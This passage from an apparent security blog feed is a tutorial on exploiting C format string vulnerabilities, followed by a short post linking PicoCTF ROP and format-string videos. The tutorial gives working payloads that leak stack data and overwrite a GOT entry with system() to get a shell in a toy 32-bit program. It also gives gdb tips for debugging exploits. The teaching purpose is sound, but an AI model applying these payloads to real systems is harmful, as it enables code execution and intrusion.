    &lt;span class="n"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since &lt;code&gt;printf&lt;/code&gt; has a variable number of arguments, it must use the format string to determine the number of arguments.
In the case above, the attacker can pass the string &lt;code&gt;"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"&lt;/code&gt; and fool the &lt;code&gt;printf&lt;/code&gt; into thinking it has 15
arguments. It will naively print the next 15 addresses on the stack, thinking they are its arguments:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;0xffffdddd 0x64 0xf7ec1289 0xffffdbdf 0xffffdbde (nil) 0xffffdcc4 0xffffdc64 (nil) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At about 10 arguments up the stack, we can see a repeating pattern of &lt;code&gt;0x252070&lt;/code&gt; - those are our &lt;code&gt;%p&lt;/code&gt;s on the stack! We start our string
with &lt;code&gt;AAAA&lt;/code&gt; to see this more explicitly:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;AAAA%p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAA0xffffdde8 0x64 0xf7ec1289 0xffffdbef 0xffffdbee (nil) 0xffffdcd4 0xffffdc74 (nil) 0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;0x41414141&lt;/code&gt; is the hex representation of &lt;code&gt;AAAA&lt;/code&gt;. We now have a way to pass an
arbitrary value (in this case, we're passing &lt;code&gt;0x41414141&lt;/code&gt;) as an argument to &lt;code&gt;printf&lt;/code&gt;. At this point we will take
advantage of another format string feature: in a format specifier, we can also select a specific argument. For example,
&lt;code&gt;printf("%2$x", 1, 2, 3)&lt;/code&gt; will print 2. In general, we can do &lt;code&gt;printf("%&amp;lt;some number&amp;gt;$x")&lt;/code&gt; to select an arbitrary argument
to &lt;code&gt;printf&lt;/code&gt;. In our case, we see that &lt;code&gt;0x41414141&lt;/code&gt; is the 10th argument to &lt;code&gt;printf&lt;/code&gt;, so we can simplify our string&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s1"&gt;&amp;#39;AAAA%10$p&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;AAAA0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So how do we turn this into an arbitrary write primitive? Well, &lt;code&gt;printf&lt;/code&gt; has a &lt;em&gt;really interesting&lt;/em&gt; format specifier: &lt;code&gt;%n&lt;/code&gt;.
From the man page of &lt;code&gt;printf&lt;/code&gt;: &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The number of characters written so far is stored into the  integer indicated  by the int * (or variant) pointer argument.  No argument is converted.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we were to pass the string &lt;code&gt;AAAA%10$n&lt;/code&gt;, we would write the value 4 to the address &lt;code&gt;0x41414141&lt;/code&gt;! We can use another 
&lt;code&gt;printf&lt;/code&gt; feature to write larger values: if we do &lt;code&gt;printf("AAAA%100x")&lt;/code&gt;, 104 characters will be output 
(because &lt;code&gt;%100x&lt;/code&gt; prints the argument padded to at least 100 characters). We can do &lt;code&gt;AAAA%&amp;lt;value-4&amp;gt;x%10$n&lt;/code&gt; to write an
arbitrary value to &lt;code&gt;0x41414141&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The next thing to know is that almost certainly don't want to write all characters in one go: for example, 
if we want to write the value &lt;code&gt;0x0804a004&lt;/code&gt;, we would have to write 134520836 characters to standard out! Instead,
we break it up into two writes: first we write &lt;code&gt;0x0804&lt;/code&gt; (2052) to the higher two bytes of the target address and then we 
write &lt;code&gt;0xa004&lt;/code&gt; (40964) to the lower two bytes of the target address. To do this, we will use &lt;code&gt;%hn&lt;/code&gt; to write only 2 bytes
at a time. Such a format string might look like this: &lt;code&gt;CAAAAAAA%2044x%10$hn%38912x%11$hn&lt;/code&gt;. Lets break this down so we can
understand it.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;CAAAAAAA&lt;/code&gt; - this is the higher two bytes of the target address (&lt;code&gt;0x41414143&lt;/code&gt;) 
      and the lower two bytes of the target address (&lt;code&gt;0x41414141&lt;/code&gt;) &lt;/li&gt;
&lt;li&gt;&lt;code&gt;%2044x%10$hn&lt;/code&gt; - since we want to have written a total of 2052 bytes when we get to the 
      first &lt;code&gt;%hn&lt;/code&gt;, and we have already written 8 bytes so far, we need to write an addition
      2044 bytes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%38912x%11$hn&lt;/code&gt; - since we want to have written a total of 40964 bytes when we get to the
      second &lt;code&gt;%hn&lt;/code&gt;, and we since we have already written 2052 bytes so far, we need to write
      an additional 38912 bytes.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here is an example of how this might be used &lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;./a.out &amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;CAAAAAAA%2044x%10$hn%38912x%11$hn&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;What can we do with them?&lt;/h1&gt;
&lt;p&gt;Since a format string vulnerability gives us the ability to write an arbitrary value 
to an arbitrary address, we can do a lot of things with it. Usually the easiest thing to do is
write to a function pointer somewhere and turn our arbitrary write primitive 
into arbitrary code execution. In dynamically linked programs, these are easy to find.
When a program attempts to execute a function in a shared library, it does not necessarily
know the location of that function at compile time. Instead, it jumps to a stub function that has a pointer
to the correct location of the function in the shared library. This pointer (located in the global offset table, or GOT)
is initialized at runtime when the stub function is first called. &lt;/p&gt;
&lt;p&gt;For example, when &lt;code&gt;strcat&lt;/code&gt; is used in a program, the
following piece of stub code allows the program to find the correct location in the shared library &lt;code&gt;libc&lt;/code&gt; at run time:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;08048330 &amp;lt;strcat@plt&amp;gt;:&lt;/span&gt;
&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here you can see that the &lt;code&gt;stcat@plt&lt;/code&gt; is the stub function that jumps to GOT entry for &lt;code&gt;strcat&lt;/code&gt; (the address &lt;code&gt;0x804a004&lt;/code&gt;),
which is set at runtime to the location in &lt;code&gt;libc&lt;/code&gt; of the &lt;code&gt;strcat&lt;/code&gt; function. We can write any value we want
to &lt;code&gt;0x804a004&lt;/code&gt;. When &lt;code&gt;strcat&lt;/code&gt; is used later in the program, the program will instead transfer code execution
to the value we specified. A common technique is to overwrite the GOT entry with the address of the function &lt;code&gt;system&lt;/code&gt;, 
thereby turning a call of &lt;code&gt;strcat(buffer, "hello")&lt;/code&gt; into the call &lt;code&gt;system(buffer)&lt;/code&gt; (if we can control the contents 
of &lt;code&gt;buffer&lt;/code&gt;, we can get a shell!).&lt;/p&gt;
&lt;h1&gt;An example&lt;/h1&gt;
&lt;p&gt;For an example, we will exploit the following C program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="c1"&gt;// compile with gcc -m32 temp.c&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="n"&gt;strdup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our plan is going to be to overwrite the GOT entry of &lt;code&gt;strdup&lt;/code&gt; with the address of &lt;code&gt;system&lt;/code&gt;, so the program
will &lt;code&gt;printf(argv[1])&lt;/code&gt; then &lt;code&gt;system(argv[1])&lt;/code&gt;. Hence, our payload must be a valid argument to &lt;code&gt;system&lt;/code&gt; - we will
start our payload with &lt;code&gt;sh;#&lt;/code&gt; (which will be &lt;code&gt;sh&lt;/code&gt; and cause the rest of the payload to be a comment. 
This also has the advantage of being exactly 4 bytes long, which isn't important for this example 
but is very useful in other cases). &lt;/p&gt;
&lt;p&gt;For every format string exploit, our payload will eventually 
look something like this: &lt;code&gt;&amp;lt;address&amp;gt;&amp;lt;address+2&amp;gt;%&amp;lt;number&amp;gt;x%&amp;lt;offset&amp;gt;$hn%&amp;lt;other number&amp;gt;x%&amp;lt;offset+1&amp;gt;$hn&lt;/code&gt;. 
We prepare a payload that will be the same length as our final payload so we can start computing
the correct offsets and addresses (note that we use &lt;code&gt;%hp&lt;/code&gt; and &lt;code&gt;%00000x&lt;/code&gt; so we can just modify the string
in the last step without modifying its length):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#AAAABBBB%00000x%17$hp%00000x%18$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00xf7fcbff48048449&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our goal is to find the correct offsets (instead of 17 and 18) so that the we output &lt;code&gt;sh;#AAAABBBB&amp;lt;garbabe&amp;gt;0x41414141&amp;lt;garbage&amp;gt;0x42424242&lt;/code&gt;. 
This takes some work, but in our case the correct offsets are 99 and 100:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#AAAABBBB%00000x%99$hp%00000x%100$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x4141414180484490x42424242
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is important to note that our payload is &lt;em&gt;very&lt;/em&gt; sensitive to a change in length: adding one byte 
to the end of the string will change the required offsets and perhaps mess up the alignment.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#AAAABBBB%00000x%99$hp%00000x%100$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;A&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x2e00000080484490x6f2e612fA
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is because the arguments are passed onto the stack before the start of our program, and so changing the
length of the arguments will change their alignment and the initial stack location for the program itself. In
order to have our exploit work consistently, we need to ensure that the payload is at a consistent alignment 
(and at a consistent offset above us on the stack) by being careful to control the amount of stuff on the stack.
This is also why we are using &lt;code&gt;env -i&lt;/code&gt; as a wrapper for our program (it clears the environment, which is also 
passed onto the stack before the start of a program).&lt;/p&gt;
&lt;p&gt;Anyways, lets find the &lt;code&gt;strdup&lt;/code&gt; GOT entry:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;08048330 &amp;lt;strdup@plt&amp;gt;:&lt;/span&gt;
&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we know where to write. We want to write the address of &lt;code&gt;system&lt;/code&gt; to the &lt;code&gt;strdup&lt;/code&gt; got entry, &lt;code&gt;0x804a004&lt;/code&gt;. 
For now, we plug in our address into the payload and make sure everything still works out:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#\x04\xa0\x04\x08\x06\xa0\x04\x08%00000x%99$hp%00000x%100$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;00x804a00480484490x804a006
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The next step is to figure out where to write. First, since it is a 32 bit binary, we can disable libc randomization. 
We disable libc randomization via:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -s unlimited
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now the address of &lt;code&gt;system&lt;/code&gt; is at a deterministic location in memory. 
We can just open up the program in &lt;code&gt;gdb&lt;/code&gt; and print the address of &lt;code&gt;system&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b main&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8048417&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08048417 in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) p system&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x555c2250 &amp;lt;system&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, now we know that we need to write &lt;code&gt;0x555c2250&lt;/code&gt; (the address of system)
to the address &lt;code&gt;0x804a004&lt;/code&gt; (the got entry of &lt;code&gt;strdup&lt;/code&gt;). We are doing this in two parts. 
First, we write &lt;code&gt;0x2250&lt;/code&gt; to the two bytes at &lt;code&gt;0x804a004&lt;/code&gt; then we write &lt;code&gt;0x555c&lt;/code&gt; to
the two bytes at &lt;code&gt;0x804a006&lt;/code&gt;. We can figure out how many bytes to write in python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x2250 - &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="c1"&gt;# We&amp;#39;ve already written 12 bytes (&amp;quot;sh;#AAAABBBB&amp;quot;).&lt;/span&gt;
&lt;span class="go"&gt;8772&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x555c - 0x2250 &lt;span class="c1"&gt;# We&amp;#39;ve already written 0x2250 bytes.&lt;/span&gt;
&lt;span class="go"&gt;13068&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we plug these values into our payload, change the &lt;code&gt;%hp&lt;/code&gt; to &lt;code&gt;%hn&lt;/code&gt;. Note that when 
we change the &lt;code&gt;%00000x&lt;/code&gt; to &lt;code&gt;%08772&lt;/code&gt;, we leave the leading &lt;code&gt;0&lt;/code&gt; so that our string
stays the same length. Here is the final exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#\x04\xa0\x04\x08\x06\xa0\x04\x08%08772x%99$hn%13068x%100$hn&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;..&amp;lt;garbage&amp;gt;..sh-4.2$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Woo hoo, we got our shell!&lt;/p&gt;
&lt;h1&gt;Debugging an exploit&lt;/h1&gt;
&lt;p&gt;Sometimes, things don't go as planned and we don't get a shell. If this
happens, &lt;code&gt;gdb&lt;/code&gt; is your friend. Unfortunately, &lt;code&gt;gdb&lt;/code&gt; isn't a very good friend.
It helpfully puts stuff in your environment, so any careful calculations you
were doing related to the stack may no longer be valid. In order to resolve
this, you need to make sure your environment looks like the environment used 
by &lt;code&gt;gdb&lt;/code&gt;. We
first see what the stack looks like under &lt;code&gt;gdb&lt;/code&gt; and then always run our exploit
with that environment:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i /usr/bin/printenv
&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q /usr/bin/printenv
&lt;span class="go"&gt;Reading symbols from /usr/bin/printenv...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) unset env&lt;/span&gt;
&lt;span class="go"&gt;Delete all environment variables? (y or n) y&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /usr/bin/printenv &lt;/span&gt;
&lt;span class="go"&gt;PWD=/home/ppp&lt;/span&gt;
&lt;span class="go"&gt;SHLVL=0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we know the environment used by &lt;code&gt;gdb&lt;/code&gt;, we can make sure to always 
execute our payload with the same environment so we can test our exploit in
&lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;SHLVL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;my_exploit_string&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# Outside gdb.&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; gdb ./a.out &lt;span class="c1"&gt;# Inside gdb.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) unset env&lt;/span&gt;
&lt;span class="go"&gt;Delete all environment variables? (y or n) y&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r &amp;quot;$(/usr/bin/python -c &amp;#39;print &amp;quot;my_exploit_string&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The most helpful thing to do in &lt;code&gt;gdb&lt;/code&gt; is to break just before the call to
&lt;code&gt;printf&lt;/code&gt; and make sure the argument and the stack stack is what you 
expect (if you expect to use &lt;code&gt;%10$hn&lt;/code&gt;, make sure the value you control is the 10th argument after the format
string).
If that works, then break right after the call to &lt;code&gt;printf&lt;/code&gt; and make sure the value you expect is at the target address.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Breakpoint 1, 0x080484ae in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/2i $pc&lt;/span&gt;
&lt;span class="go"&gt;=&amp;gt; 0x80484ae &amp;lt;main+74&amp;gt;: call   0x8048360 &amp;lt;printf@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x80484b3 &amp;lt;main+79&amp;gt;: mov    $0x0,%eax&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb70: 0xffffdb98&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/s 0xffffdb98&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb98:  &amp;quot;AAAA%10$p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/11a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb70: 0xffffdb98  0xffffdddd  0x64    0xf7ec1289&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb80: 0xffffdbbf  0xffffdbbe  0x0 0xffffdca4&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb90: 0xffffdc44  0x0 0x41414141&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp + 40&lt;/span&gt;
&lt;span class="go"&gt;0xffffdb98: 0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;You'll note the single quotes - &lt;code&gt;$&lt;/code&gt; is a special symbol on the shell and would otherwise need to be escaped.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;You'll note that we use print the exploit string in a python subshell. 
This isn't strictly necessary in this case, but for more interesting exploits the ability to print escape characters
and use arbitrary bytes in our payload is very useful. We also print via &lt;code&gt;sys.stdout.write&lt;/code&gt; to prevent the newline
at the end we would get if we otherwise used &lt;code&gt;print&lt;/code&gt; and surround the subshell in double quotes in case the payload had
whitespace in it.&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>PicoCTF Videos</title><link href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html" rel="alternate"></link><published>2013-04-28T00:00:00-07:00</published><updated>2013-04-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-28:/posts/2013/04/28/picoctf-videos.html</id><summary type="html">&lt;p&gt;For PicoCTF this year, I made some slides and recorded some video tutorials.&lt;/p&gt;</summary><content type="html">&lt;p&gt;For &lt;a href="picoctf.com"&gt;PicoCTF&lt;/a&gt; this year, I made some slides and recorded some
video tutorials. I'll probably turn these into better tutorials on this blog at
some later point.&lt;/p&gt;
&lt;h1&gt;Introduction to Return Oriented Programming (ROP)&lt;/h1&gt;
&lt;!-- &lt;video width="100%" controls&gt;
  &lt;source src="https://dl.dropboxusercontent.com/u/15197322/easy_rop.mp4"&gt;
&lt;/video&gt; --&gt;

&lt;iframe src="http://player.vimeo.com/video/65014453" width="500" height="375"
frameborder="0" webkitAllowFullScreen mozallowfullscreen
allowFullScreen&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href="https://dl.dropboxusercontent.com/u/15197322/easy_rop.pdf"&gt;slides&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Introduction to Format String Vulnerabities&lt;/h1&gt;
&lt;!-- &lt;video controls width="100%"&gt;
  &lt;source src="https://dl.dropboxusercontent.com/u/15197322/easy_format.mp4"&gt;
&lt;/video&gt; --&gt;

&lt;iframe src="http://player.vimeo.com/video/65014452" width="500" height="375"
frameborder="0" webkitAllowFullScreen mozallowfullscreen
allowFullScreen&gt;&lt;/iframe&gt;

